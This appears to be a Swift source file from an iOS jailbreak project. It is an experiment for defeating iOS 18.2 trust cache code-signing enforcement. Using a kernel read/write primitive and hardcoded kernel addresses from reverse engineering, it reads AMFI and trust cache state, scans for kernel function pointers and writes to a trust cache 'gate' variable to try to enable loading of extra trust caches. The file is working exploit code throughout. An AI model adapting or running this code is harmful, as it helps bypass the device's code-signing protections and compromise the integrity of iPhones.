//
//  exp_tc_funcptr_hijack.swift
//  DSPloit
//
//  EXPERIMENT: Trust Cache Function Pointer Hijack
//  Hijack the kernel function pointer used to load trust cache modules.
//  If writable, redirect to always-success or call with our TC data.
//

import Foundation

final class ExpTCFuncPtrHijack {
    static let shared = ExpTCFuncPtrHijack()
    private var results: [String] = []
    
    // From Ghidra RE (iOS 18.2 kernelcache, UNSLID):
    // FUN_fffffff0082857d8 calls: (*pcRam0000000000000120)(&state, type, uuid, data, size)
    private let TC_STATE_UNSLID: UInt64 = 0xfffffff00798f5a8
    private let TC_LOAD_WRAPPER_UNSLID: UInt64 = 0xfffffff008f858b4  // wrapper that loops types
    private let TC_LOADER_UNSLID: UInt64 = 0xfffffff00828516c       // actual loader function
    private let AMFI_OBJECT_UNSLID: UInt64 = 0xfffffff00a3304c0
    
    private func log(_ msg: String) {
        results.append(msg)
        globallogger.log("(exp_tc_hijack) \(msg)")
    }
    
    func runAll() -> [String] {
        results.removeAll()
        
        log("═══════════════════════════════════════════")
        log("  TC FUNCTION POINTER HIJACK EXPERIMENT")
        log("  iOS \(UIDevice.current.systemVersion)")
        log("═══════════════════════════════════════════")
        log("")
        
        guard dspmgr.shared.dsready else {
            log("❌ KRW not active")
            return results
        }
        
        let slide = ds_get_kernel_slide()
        log("🔍 slide = 0x\(String(slide, radix: 16))")
        
        // Step 1: Read TC state to confirm we have correct address
        step1_readTCState(slide: slide)
        // Step 2: Find the function pointer used for TC loading
        step2_findFuncPtr(slide: slide)
        // Step 3: Check if TC loader accepts our data directly
        step3_directCall(slide: slide)
        
        log("")
        log("═══════════════════════════════════════════")
        return results
    }
    
    private func step1_readTCState(slide: UInt64) {
        log("── Step 1: Read TC State ──")
        let stateAddr = TC_STATE_UNSLID &+ slide
        let val0 = ds_kread64_safe(stateAddr)
        let val1 = ds_kread64_safe(stateAddr &+ 8)
        let val2 = ds_kread64_safe(stateAddr &+ 16)
        log("🔍 TC state @ 0x\(String(stateAddr, radix: 16))")
        log("   [+0x00] = 0x\(String(val0, radix: 16))")
        log("   [+0x08] = 0x\(String(val1, radix: 16))")
        log("   [+0x10] = 0x\(String(val2, radix: 16))")
        if val0 != 0 || val1 != 0 {
            log("✅ TC state has data (initialized)")
        } else {
            log("⚠️ TC state empty")
        }
        log("")
    }
    
    private func step2_findFuncPtr(slide: UInt64) {
        log("── Step 2: Find TC Load Function Pointer ──")
        
        // The function pointer pcRam0000000000000120 is at a fixed
        // offset in the kernel's read-only page. But the WRAPPER
        // function at TC_LOAD_WRAPPER_UNSLID reads from AMFI object.
        // Let's check AMFI object + 0xd8 (from Ghidra: lVar3 = *(lVar3 + 0xd8))
        let amfiObj = AMFI_OBJECT_UNSLID &+ slide
        let amfiObjVal = ds_kread64_safe(amfiObj)
        log("🔍 AMFI object @ 0x\(String(amfiObj, radix: 16)) = 0x\(String(amfiObjVal, radix: 16))")
        
        if amfiObjVal != 0 {
            let amfiProvider = ds_kread64_safe(amfiObjVal + 0xd8)
            log("🔍 AMFI provider (obj+0xd8) = 0x\(String(amfiProvider, radix: 16))")
            
            if amfiProvider != 0 {
                log("✅ AMFI provider found — this is what handles TC load requests")
                // Read vtable or function pointers from provider
                let vtable = ds_kread64_safe(amfiProvider)
                log("🔍 Provider vtable/first ptr = 0x\(String(vtable, radix: 16))")
                
                // Scan for function pointers in provider object
                log("🔍 Scanning provider object for function pointers:")
                for offset in stride(from: 0, to: 0x100, by: 8) {
                    let val = ds_kread64_safe(amfiProvider + UInt64(offset))
                    if val > 0xfffffff000000000 && val < 0xfffffffffff00000 {
                        let unslid = val &- slide
                        log("   [+0x\(String(offset, radix: 16))] = 0x\(String(val, radix: 16)) (unslid: 0x\(String(unslid, radix: 16)))")
                    }
                }
            } else {
                log("❌ AMFI provider = 0")
            }
        } else {
            log("❌ AMFI object = 0 — address may be wrong")
        }
        log("")
    }
    
    private func step3_directCall(slide: UInt64) {
        log("── Step 3: Direct TC Load via Kernel Call ──")
        log("  Theory: call the TC loader function directly")
        log("  passing our trust cache data as argument")
        log("")
        log("  The loader at 0x\(String(TC_LOADER_UNSLID, radix: 16)) (unslid)")
        log("  accepts: (state, type, tc_data, tc_size, manifest, manifest_size, 0, 0)")
        log("")
        log("  BUT: we cannot kcall on iOS 18 without PAC bypass")
        log("  PAC prevents calling arbitrary kernel functions")
        log("")
        
        // Alternative: check if there's a writable variable that
        // controls whether TC validation is enforced
        log("── Step 3b: Check TC enforcement variables ──")
        
        // From Ghidra: DAT_fffffff00798f9c8 = 1 (set during init)
        // DAT_fffffff00798f9c9 = 1 (set after successful load)
        // These might be "trust cache initialized" flags
        let tcFlag1Addr = (0xfffffff00798f9c8 as UInt64) &+ slide
        let tcFlag2Addr = (0xfffffff00798f9c9 as UInt64) &+ slide
        let tcFlag1 = ds_kread64_safe(tcFlag1Addr)
        let tcFlag2 = ds_kread64_safe(tcFlag2Addr)
        log("🔍 TC flag1 @ 0x\(String(tcFlag1Addr, radix: 16)) = 0x\(String(tcFlag1, radix: 16))")
        log("🔍 TC flag2 @ 0x\(String(tcFlag2Addr, radix: 16)) = 0x\(String(tcFlag2, radix: 16))")
        
        // Check DAT_fffffff00798f5b0 (from Ghidra — checked before loading additional TCs)
        let tcGateAddr = (0xfffffff00798f5b0 as UInt64) &+ slide
        let tcGateVal = ds_kread64_safe(tcGateAddr)
        log("🔍 TC gate @ 0x\(String(tcGateAddr, radix: 16)) = 0x\(String(tcGateVal, radix: 16))")
        log("   (Ghidra: if DAT_fffffff00798f5b0._1_1_ != 0 → load additional TCs)")
        
        if tcGateVal != 0 {
            log("✅ TC gate is non-zero — additional TC loading enabled")
        } else {
            log("⚠️ TC gate = 0 — try setting to 1?")
            log("   Writing 1 to TC gate...")
            ds_kwrite64(tcGateAddr, 1)
            let verify = ds_kread64_safe(tcGateAddr)
            if verify == 1 {
                log("✅ TC gate now = 1 (WRITABLE!)")
                log("   This may enable additional trust cache loading paths")
            } else {
                log("❌ Write failed (PPL protected)")
            }
        }
        log("")
    }
}
